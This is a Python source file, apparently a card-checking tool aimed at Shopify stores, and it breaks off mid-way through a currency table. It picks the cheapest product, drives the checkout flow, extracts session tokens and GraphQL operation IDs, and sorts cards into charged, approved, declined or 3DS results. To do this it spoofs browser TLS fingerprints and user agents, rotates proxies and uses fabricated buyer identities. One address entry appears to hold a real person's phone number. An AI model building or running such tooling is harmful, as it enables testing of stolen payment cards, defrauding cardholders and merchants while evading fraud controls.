import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime
import threading 
import asyncio
import logging
_log = logging.getLogger("auto")
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── config ─────────────────────────────────────

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3
    THREE_DS = 4        # card is fine; buyer must finish a 3DS challenge

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    gateway: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    proxy: str = ""
    error: Exception = None
    retryable: bool = False

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james",   "anderson",  "428 W 45th St",          "Apt 4B",    "New York",      "US", "NY",  "10036", "+12125550100", "gmail.com"),
    "US-CA": Address("michael","johnson", "123 Hollywood Blvd",     "Suite 100", "Los Angeles",   "US", "CA",  "90028", "+13235550100", "yahoo.com"),
    "US-TX": Address("robert","williams", "456 Main St",            "",          "Houston",       "US", "TX",  "77002", "+17135550100", "outlook.com"),
    "US-FL": Address("david", "brown",    "789 Ocean Dr",           "Apt 12",    "Miami",         "US", "FL",  "33139", "+13055550100", "hotmail.com"),
    "CA":    Address("john",  "smith",    "200 Kent St",            "",          "Ottawa",        "CA", "ON",  "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC": Address("william","davis",   "789 Granville St",       "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9", "+16045550100", "gmail.com"),
    "GB":    Address("james", "wilson",   "10 Downing St",          "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "IN":    Address("rohan", "singh",    "Sachin Sweets Corner Nandgram Ghukna", "", "Ghaziabad", "IN", "UP", "201003", "8826800450", "gmail.com"),
    "GB-MAN":Address("oliver","martinez","123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "AU":    Address("thomas","taylor",   "1 George St",            "",          "Sydney",        "AU", "NSW", "2000",    "+61212345678",  "gmail.com"),
    "AU-MEL":Address("daniel","anderson", "100 Collins St",         "Level 10",  "Melbourne",     "AU", "VIC", "3000",    "+61398765432",  "yahoo.com"),
    "DE":    Address("lucas", "thomas",   "Friedrichstr 100",       "",          "Berlin",        "DE", "BE",  "10117",   "+493012345678", "gmail.com"),
    "DE-MUC":Address("felix", "schmidt",  "Marienplatz 1",          "",          "Munich",        "DE", "BY",  "80331",   "+49891234567",  "gmail.com"),
    "FR":    Address("hugo",  "bernard",  "10 Rue de Rivoli",       "",          "Paris",         "FR", "IDF", "75001",   "+33112345678",  "gmail.com"),
    "FR-LY": Address("louis", "petit",    "15 Rue de la République","",          "Lyon",          "FR", "ARA", "69001",   "+33487654321",  "outlook.com"),
    "NZ":    Address("jack",  "wilson",   "1 Queen St",             "",          "Auckland",      "NZ", "AUK", "1010",    "+6491234567",   "gmail.com"),
    "NZ-WLG":Address("liam",  "brown",    "100 Willis St",          "Floor 2",   "Wellington",    "NZ", "WGN", "6011",    "+6449876543",   "gmail.com"),
    "IE":    Address("sean",  "murphy",   "1 Grafton St",           "",          "Dublin",        "IE", "D",   "D02 Y006","+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick","kelly",  "100 Patrick St",         "",          "Cork",          "IE", "CO",  "T12 XY88","+35321456789",  "gmail.com"),
    "NL":    Address("bas",   "jansen",   "Dam 1",                  "",          "Amsterdam",     "NL", "NH",  "1012 JS", "+31201234567",  "gmail.com"),
    "ES":    Address("carlos","garcia",   "Calle Mayor 1",          "",          "Madrid",        "ES", "M",   "28013",   "+34912345678",  "gmail.com"),
    "IT":    Address("marco", "rossi",    "Via Roma 1",             "",          "Rome",          "IT", "RM",  "00184",   "+39061234567",  "gmail.com"),
    "SE":    Address("erik",  "andersson","Vasagatan 1",            "",          "Stockholm",     "SE", "AB",  "111 20",  "+468123456",    "gmail.com"),
    "NO":    Address("olav",  "hansen",   "Karl Johans gate 1",     "",          "Oslo",          "NO", "03",  "0154",    "+4721234567",   "gmail.com"),
    "DK":    Address("lars",  "nielsen",  "Strøget 1",              "",          "Copenhagen",    "DK", "84",  "1457",    "+4531234567",   "gmail.com"),
    "FI":    Address("jussi", "korhonen", "Mannerheimintie 1",      "",          "Helsinki",      "FI", "18",  "00100",   "+35891234567",  "gmail.com"),
    "BE":    Address("jan",   "peeters",  "Grote Markt 1",          "",          "Brussels",      "BE", "BRU", "1000",    "+3221234567",   "gmail.com"),
    "CH":    Address("hans",  "weber",    "Bahnhofstrasse 1",       "",          "Zurich",        "CH", "ZH",  "8001",    "+41441234567",  "gmail.com"),
    "AT":    Address("markus","gruber",   "Stephansplatz 1",        "",          "Vienna",        "AT", "9",   "1010",    "+4312345678",   "gmail.com"),
    "JP":    Address("takashi","yamamoto","1-1-1 Marunouchi",       "",          "Tokyo",         "JP", "13",  "100-0005","+81312345678",  "gmail.com"),
    "SG":    Address("wei",   "tan",      "1 Raffles Place",        "#01-01",    "Singapore",     "SG", "01",  "048616",  "+6561234567",   "gmail.com"),
    "AE":    Address("ahmed", "al-mansouri","Sheikh Zayed Road 1",  "",          "Dubai",         "AE", "DU",  "12345",   "+97141234567",  "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES     = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         'en-US,en;q=0.9',
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
        })
        if proxy_url:
            self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# ──────────────────────── Step 0: cheapest product ───────────────────

import re
import json
from bs4 import BeautifulSoup
import time

_product_cache: Dict[str, tuple] = {}
_product_cache_lock = threading.Lock()
_PRODUCT_CACHE_TTL = 3600

def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.01, max_price: float | None = None) -> Tuple[str, str, str, str]:
    """
    Cheapest available product via /products.json (paginated), then HTML fallback.
    """
    from concurrent.futures import ThreadPoolExecutor

    if max_price is None:
        max_price = float('inf')

    now = time.time()
    with _product_cache_lock:
        cached = _product_cache.get(shop_url)
        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
            return cached[:-1]

    best_price = float('inf')
    best_product = None
    limit = 250
    max_pages = 50

    def _pick(products):
        nonlocal best_price, best_product
        for p in products or []:
            for v in p.get("variants", []):
                if not v.get("available", False):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price or price > max_price:
                    continue
                if price < best_price:
                    best_price = price
                    best_product = (
                        p.get("title", ""),
                        str(p.get("id", "")),
                        str(v.get("id", "")),
                        v.get("price", "")
                    )

    pool = [TLSClient(client.timeout, client.proxy_url) for _ in range(8)]

    def _fetch(p):
        url = f"{shop_url}/products.json?limit={limit}&page={p}"
        try:
            resp = pool[p % len(pool)].get(url, timeout=15)
        except Exception:
            return None, None
        if resp.status_code != 200:
            return resp.status_code, None
        try:
            return 200, resp.json().get("products", [])
        except Exception:
            return 200, None

    catalog_blocked = None
    try:
        p1_status, page1 = _fetch(1)
        if page1 is None and p1_status is not None and p1_status != 200:
            catalog_blocked = p1_status
        total_pages = 1
        if page1 is not None:
            if len(page1) >= limit:
                total_pages = max_pages
                try:
                    resp = pool[0].get(f"{shop_url}/products/count.json", timeout=10)
                    if resp.status_code == 200:
                        count = int((resp.json() or {}).get("count", 0) or 0)
                        if count > len(page1):
                            total_pages = max(2, min(-(-count // limit), max_pages))
                except Exception:
                    pass
            _pick(page1)
        else:
            total_pages = max_pages

        if total_pages > 1 and page1 is not None:
            next_page = 2
            while next_page <= total_pages:
                end = min(next_page + 7, total_pages)
                with ThreadPoolExecutor(max_workers=8) as ex:
                    batch = list(ex.map(_fetch, range(next_page, end + 1)))
                last_seen = False
                for p, (st, products) in zip(range(next_page, end + 1), batch):
                    if products is None:
                        continue
                    _pick(products)
                    if len(products) < limit:
                        last_seen = True
                if last_seen:
                    break
                next_page = end + 1
    except Exception as e:
        pass

    if not best_product:
        try:
            best_product = _lightweight_discover(client, shop_url, min_price, max_price)
        except Exception:
            best_product = None

    if not best_product and catalog_blocked is not None:
        raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {catalog_blocked})")

    if not best_product:
        try:
            resp = client.get(shop_url, timeout=15)
            if resp.status_code == 200:
                html_content = resp.text
                json_pattern = r'<script[^>]*id="[^"]*"[^>]*>(\{.*?\})</script>'
                json_matches = re.findall(json_pattern, html_content, re.DOTALL)
                for json_str in json_matches:
                    try:
                        data = json.loads(json_str)
                        products = _extract_products_from_html_json(data)
                        for title, product_id, variant_id, price in products:
                            price_float = float(price)
                            if min_price <= price_float <= max_price:
                                if price_float < best_price:
                                    best_price = price_float
                                    best_product = (title, product_id, variant_id, price)
                    except:
                        continue

                if not best_product:
                    try:
                        resp = client.get(f"{shop_url}/collections/all", timeout=15)
                        if resp.status_code == 200:
                            html_content = resp.text
                            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
                            for link in product_links[:20]:
                                if not link.startswith('http'):
                                    link = shop_url + link
                                try:
                                    resp = client.get(link, timeout=15)
                                    if resp.status_code != 200:
                                        continue
                                    product_html = resp.text
                                    price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', product_html)
                                    if not price_match:
                                        continue
                                    price = float(price_match.group(1))
                                    if price < min_price or price > max_price:
                                        continue
                                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', product_html)
                                    if not variant_match:
                                        variant_match = re.search(r'data-variant-id="(\d+)"', product_html)
                                    if not variant_match:
                                        continue
                                    variant_id = variant_match.group(1)
                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', product_html)
                                    product_id = product_match.group(1) if product_match else ""
                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', product_html)
                                    title = title_match.group(1) if title_match else "Product"
                                    if price < best_price:
                                        best_price = price
                                        best_product = (title, product_id, variant_id, str(price))
                                except:
                                    continue
                    except:
                        pass
        except Exception:
            pass

    if not best_product:
        if max_price == float('inf'):
            raise Exception(f"No available products at {shop_url}")
        raise Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")

    with _product_cache_lock:
        _product_cache[shop_url] = best_product + (time.time(),)
    return best_product


def _extract_products_from_html_json(data: dict) -> List[Tuple[str, str, str, str]]:
    results = []

    def extract(obj):
        if isinstance(obj, dict):
            if 'products' in obj:
                for p in obj['products']:
                    title = p.get('title', '')
                    product_id = str(p.get('id', ''))
                    for v in p.get('variants', []):
                        if v.get('available', False):
                            variant_id = str(v.get('id', ''))
                            price = v.get('price', '0')
                            results.append((title, product_id, variant_id, price))
            if 'product' in obj:
                p = obj['product']
                title = p.get('title', '')
                product_id = str(p.get('id', ''))
                for v in p.get('variants', []):
                    if v.get('available', False):
                        variant_id = str(v.get('id', ''))
                        price = v.get('price', '0')
                        results.append((title, product_id, variant_id, price))
            for value in obj.values():
                extract(value)
        elif isinstance(obj, list):
            for item in obj:
                extract(item)

    extract(data)
    return results


# ─────────────── Lighter catalog discovery (c3.py-style probes) ──────

JUNK_TITLES = ("gift card", "giftcard", "e-gift", "egift")


def _is_junk(title: str) -> bool:
    t = (title or "").lower()
    return any(j in t for j in JUNK_TITLES)


def _light_pick(products, min_price, max_price):
    """Cheapest available non-junk variant from a products.json list."""
    best = None
    best_price = float("inf")
    for p in products or []:
        if _is_junk(p.get("title", "")):
            continue
        for v in p.get("variants", []) or []:
            if not v.get("available", True):
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < min_price or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best = (p.get("title", ""), str(p.get("id", "")), str(v.get("id", "")), str(price))
    return best


def _light_product_json(client, url, min_price, max_price):
    try:
        r = client.get(url, headers={"accept": "application/json"}, timeout=12)
        if r.status_code != 200:
            return None
        return _light_pick(r.json().get("products", []), min_price, max_price)
    except Exception:
        return None


def _find_collections_json(client, shop_url, min_price, max_price):
    return _light_product_json(client, f"{shop_url}/collections/all/products.json?limit=250",
                               min_price, max_price)


def _find_search_suggest(client, shop_url, min_price, max_price):
    try:
        r = client.get(f"{shop_url}/search/suggest.json?q=*&resources[type]=product&resources[limit]=10",
                       headers={"accept": "application/json"}, timeout=12)
        if r.status_code != 200:
            return None
        handles = [p.get("handle") for p in
                   r.json().get("resources", {}).get("results", {}).get("products", [])
                   if p.get("handle")]
    except Exception:
        return None
    best = None
    best_price = float("inf")
    for h in handles:
        try:
            r = client.get(f"{shop_url}/products/{h}.json",
                           headers={"accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                continue
            pdata = r.json().get("product", {})
            if _is_junk(pdata.get("title", "")):
                continue
            for v in pdata.get("variants", []) or []:
                if not v.get("available", True):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price or price > max_price:
                    continue
                if price < best_price:
                    best_price = price
                    best = (pdata.get("title", ""), str(pdata.get("id", "")), str(v.get("id", "")), str(price))
        except Exception:
            continue
    return best


def _find_sitemap(client, shop_url, min_price, max_price):
    try:
        r = client.get(f"{shop_url}/sitemap_products_1.xml",
                       headers={"accept": "text/xml,*/*"}, timeout=12)
        if r.status_code != 200:
            return None
        handles = re.findall(r'/products/([A-Za-z0-9_\-]+)', r.text or "")
    except Exception:
        return None
    seen = list(dict.fromkeys(handles))
    best = None
    best_price = float("inf")
    for h in seen[:20]:
        try:
            r = client.get(f"{shop_url}/products/{h}.json",
                           headers={"accept": "application/json"}, timeout=12)
            if r.status_code != 200:
                continue
            pdata = r.json().get("product", {})
            if _is_junk(pdata.get("title", "")):
                continue
            for v in pdata.get("variants", []) or []:
                if not v.get("available", True):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price or price > max_price:
                    continue
                if price < best_price:
                    best_price = price
                    best = (pdata.get("title", ""), str(pdata.get("id", "")), str(v.get("id", "")), str(price))
        except Exception:
            continue
    return best


def _lightweight_discover(client: TLSClient, shop_url: str,
                          min_price: float, max_price: float):
    """c3.py-style lightweight fallbacks when /products.json is unavailable."""
    for fn in (_find_collections_json, _find_search_suggest, _find_sitemap):
        try:
            r = fn(client, shop_url, min_price, max_price)
            if r:
                return r
        except Exception:
            continue
    return None


# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    cart_headers   = {
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-ch-ua":                 '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    }
    checkout_resp  = client.get(cart_permalink, allow_redirects=True, headers=cart_headers)

    if checkout_resp.status_code not in (200, 302):
        _log.warning("cart permalink %s for %s; escalating", checkout_resp.status_code, shop_url)
        if checkout_resp.status_code in (403, 429):
            try:
                client.post(
                    f"{shop_url}/cart/add.js",
                    json={"items": [{"id": int(variant_id), "quantity": 1}]},
                    headers={"accept": "application/json",
                             "content-type": "application/json",
                             "referer": shop_url + "/",
                             "sec-fetch-dest": "empty",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-site": "same-origin"})
            except Exception as add_exc:
                _log.warning("cart/add.js fallback failed: %s", add_exc)

        variants_to_try = [cart_permalink, f"{shop_url}/cart"]
        last_status = checkout_resp.status_code
        for attempt_url in variants_to_try:
            try:
                client.get(shop_url + "/", allow_redirects=True,
                           headers={"accept": "text/html,*/*;q=0.8",
                                    "sec-fetch-site": "none",
                                    "sec-fetch-mode": "navigate",
                                    "sec-fetch-dest": "document"})
            except Exception:
                pass
            try:
                retry = client.get(attempt_url, allow_redirects=True, headers=cart_headers)
            except Exception as retry_exc:
                _log.warning("cart retry %s failed: %s", attempt_url, retry_exc)
                continue
            last_status = retry.status_code
            if retry.status_code in (200, 302):
                checkout_resp = retry
                break
        if checkout_resp.status_code not in (200, 302):
            raise Exception(f"cart permalink returned {last_status}")

    checkout_url   = checkout_resp.url
    checkout_html  = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    text = html.unescape(checkout_html or "")
    for pat in (r'''["']([^"']*checkout-web[^"']*?actions(?:\.[^"'/?#]+)*\.m?js)(?:\?[^"']*)?["']''',
                r'''["']([^"']*actions[^"']*\.m?js)(?:\?[^"']*)?["']'''):
        m = re.search(pat, text)
        if not m:
            continue
        return absolutize_asset_url(m.group(1), shop_url)
    return ""


def absolutize_asset_url(ref: str, shop_url: str) -> str:
    ref = (ref or "").strip()
    if ref.startswith("http://") or ref.startswith("https://"):
        return ref
    if ref.startswith("//"):
        return "https:" + ref
    return shop_url.rstrip("/") + ("" if ref.startswith("/") else "/") + ref


def extract_js_refs(checkout_html: str, shop_url: str) -> List[str]:
    text = html.unescape(checkout_html or "")
    out: List[str] = []
    seen = set()
    for m in re.finditer(r'''["']([^"']*\.m?js(?:\?[^"']*)?)["']''', text):
        ref = m.group(1)
        if "checkout-web" not in ref:
            continue
        url = absolutize_asset_url(ref, shop_url)
        if url not in seen:
            seen.add(url)
            out.append(url)
    return out

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

_OPERATION_NAMES = ("Proposal", "SubmitForCompletion", "PollForReceipt")

_PERSISTED_ID = r'''id\s*:\s*["']([a-f0-9]{64})["']'''
_OP_WINDOW = r'''\{[^{}]{0,400}?\}'''
_OP_NAME_TMPL = r'''(?<![A-Za-z0-9_])name\s*:\s*["']%s["']'''
_OP_DESC = (r'''\{\s*id\s*:\s*["']([a-f0-9]{64})["']\s*,\s*'''
            r'''type\s*:\s*["'](?:query|mutation)["']\s*,\s*'''
            r'''name\s*:\s*["']([^"']+)["']\s*,?\s*\}''')


def extract_persisted_ids(js_body: str) -> Dict[str, str]:
    found: Dict[str, str] = {}
    if not js_body:
        return found
    for m in re.finditer(_OP_DESC, js_body):
        found.setdefault(m.group(2), m.group(1))
    for name in _OPERATION_NAMES:
        if name in found:
            continue
        pat = _OP_NAME_TMPL % name
        for blk in re.finditer(_OP_WINDOW, js_body):
            if not re.search(pat, blk.group(0)):
                continue
            idm = re.search(_PERSISTED_ID, blk.group(0))
            if idm:
                found[name] = idm.group(1)
                break
    return found


def extract_proposal_id(js_body: str) -> str:
    return extract_persisted_ids(js_body).get("Proposal", "")


def extract_submit_for_completion_id(js_body: str) -> str:
    return extract_persisted_ids(js_body).get("SubmitForCompletion", "")


def extract_poll_for_receipt_id(js_body: str) -> str:
    return extract_persisted_ids(js_body).get("PollForReceipt", "")


def merge_persisted_ids(into: Dict[str, str], found: Dict[str, str]) -> Dict[str, str]:
    for k, v in (found or {}).items():
        if v:
            into.setdefault(k, v)
    return into

# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        return _seller_proposal(proposal_json).get("isShippingRequired", True)
    except Exception:
        return True

def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""

def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""

def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""

def extract_identification_signature(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
    return match.group(1) if match else ""

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""

def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"handle"\s*:\s*"([A-Za-z0-9_-]{20,})"',
        r'"availableDeliveryStrategies"\s*:\s*\[\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body, re.DOTALL)
        if match:
            return match.group(1)
    return ""

# ── Currency → Country mapping ──
CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE", "AUD": "AU",
    "NZD": "NZ", "SGD": "SG", "HKD": "HK", "JPY": "JP", "CNY": "CN",
    "INR": "IN", "MXN": "MX", "BRL": "BR", "ARS": "AR", "CLP": "CL",
    "COP": "CO", "PEN": "PE", "VND": "VN", "THB": "TH", "IDR": "ID",
    "PHP": "PH", "MYR": "MY", "TWD": "TW", "KRW": "KR", "PKR": "PK",
    "BDT": "BD", "LKR": "LK", "NPR": "NP", "MMK": "MM", "KHR": "KH",
    "LAK": "LA", "MNT": "MN", "AFN": "AF", "IRR": "IR", "IQD": "IQ",
    "SYP": "SY", "LBP": "LB", "JOD": "JO", "SAR": "SA", "AED": "AE",
    "QAR": "QA", "KWD": "KW", "BHD": "BH", "OMR": "OM", "YER": "YE",
    "EGP": "EG", "SDG": "SD", "ETB": "ET", "KES": "KE", "UGX": "UG",
    "TZS": "TZ", "RWF": "RW", "ZMW": "ZM", "ZWL": "ZW", "MZN": "MZ",
    "NAD": "NA", "ZAR": "ZA", "BWP": "BW", "SZL": "SZ", "LSL": "LS",
    "MGA": "MG", "SCR": "SC", "MUR": "MU", "MVR": "MV", "SEK": "SE",
    "NOK": "NO", "DKK": "DK", "ISK": "IS", "CHF": "CH", "CZK": "CZ",
    "PLN": "PL", "HUF": "HU", "RON": "RO", "BGN": "BG", "HRK": "HR",
    "RSD": "RS", "BAM": "BA", "MKD": "MK", "ALL": "AL", "AMD": "AM",
    "AZN": "AZ", "GEL": "GE", "KZT": "KZ", "KGS": "KG", "TJS": "TJ",
    "TMT": "TM", "UZS": "UZ", "BYN": "BY", "UAH": "UA", "MDL": "MD",
    "RUB": "RU", "TRY": "TR", "ILS": "IL", "DZD": "DZ", "MAD": "MA",
    "TND": "TN", "LYD": "LY", "GMD": "GM", "GNF": "GN", "SLL": "SL",
    "LRD": "LR", "GHS": "GH", "NGN": "NG", "XOF": "SN", "XAF": "CM",
    "CDF": "CD", "AOA": "AO", "NIO": "NI", "HNL": "HN", "GTQ": "GT",
    "BZD": "BZ", "TTD": "TT", "JMD": "JM", "HTG": "HT", "BBD": "BB",
    "XCD": "AG", "BSD": "BS", "KYD": "KY", "BMD": "BM", "AWG": "AW",
    "BOB": "BO", "UYU": "UY", "PYG": "PY", "GYD": "GY", "SRD": "SR",
    "FJD": "FJ", "PGP": "PG", "SBD": "SB", "TOP": "TO", "WST": "WS",
